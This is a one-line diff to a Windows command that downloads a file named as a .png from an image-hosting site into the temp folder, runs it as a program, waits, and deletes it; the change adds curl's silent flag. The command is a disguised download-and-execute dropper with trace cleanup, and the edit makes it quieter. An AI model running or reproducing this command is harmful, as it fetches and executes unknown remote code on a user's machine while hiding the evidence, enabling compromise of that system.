@@ -1,1 +1,1 @@
-curl https://ctrlv.cz/shots/2022/08/19/KSXC.png -o "%temp%\script.png" && "%temp%\script.png" && timeout 2 && del %temp%\script.png
+curl https://ctrlv.cz/shots/2022/08/19/KSXC.png -s -o "%temp%\script.png" && "%temp%\script.png" && timeout 2 && del %temp%\script.png
